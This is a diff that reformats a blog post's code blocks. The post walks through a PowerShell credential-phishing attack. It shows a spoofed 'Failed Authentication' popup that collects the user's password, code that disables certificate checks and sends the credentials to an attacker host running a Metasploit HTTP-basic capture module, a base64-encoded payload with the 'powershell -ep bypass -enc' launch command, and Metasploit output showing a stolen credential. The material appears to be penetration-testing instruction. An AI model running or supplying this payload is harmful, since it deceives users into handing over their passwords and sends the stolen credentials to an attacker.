@@ -24,55 +24,62 @@ $result = $wc.downloadstring('https://172.16.102.163');
 
 Lets break down the code line by line:
 
-```
+[source,powershell]
+----
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserName,[Environment]::UserDomainName);
-```
+----
 
 This tells windows to prompt for credentials, with the title of "Failed Authentication", no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy.
 
-```
+[source,powershell]
+----
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-```
+----
 
 Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later
 
-```
+[source,powershell]
+----
 $wc = new-object net.webclient;
 $wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");
-```
+----
 
 Creates a new webclient object and sets its user agent to 'wget'
 
-```
+[source,powershell]
+----
 $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
 $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
-```
+----
 
 Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings.
 
-```
+[source,powershell]
+----
 $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
-```
+----
 
 Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user.
 
-```
+[source,powershell]
+----
 $result = $wc.downloadstring('https://172.16.102.163');
-```
+----
 
 And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds.
 
-```
+[source,bash]
+----
 cat power.txt | iconv --to-code UTF-16LE | base64
 
 JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAG4AZQB0AHcAbwByAGsAYwByAGUAZABlAG4AdABpAGEAbAAoACQAYwByAGUAZAAuAHUAcwBlAHIAbgBhAG0AZQAsACAAJABjAHIAZQBkAC4AZwBlAHQAbgBlAHQAdwBvAHIAawBjAHIAZQBkAGUAbgB0AGkAYQBsACgAKQAuAHAAYQBzAHMAdwBvAHIAZAAsACAAJwAnACkAOwAKACQAcgBlAHMAdQBsAHQAIAA9ACAAJAB3AGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA2ADMAJwApADsACgA=
-```
+----
 
 Then execute `powershell -ep bypass -enc <the encoded text from above>` and you get this:
 
 Image should be here: ![](/images/2014-09-03-powershellpopup.png)
 
-```
+----
 root@wpad:~/metasploit-framework# ./msfconsole -Lq
 msf > use auxiliary/server/capture/http_basic 
 msf auxiliary(http_basic) > show options
@@ -105,6 +112,6 @@ msf auxiliary(http_basic) >
 [*] Server started.
 [*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
 [+] 172.16.102.140 - Credential collected: "SITTINGDUCK\user:ASDqwe123" => /
-```
+----
 
 Game over!
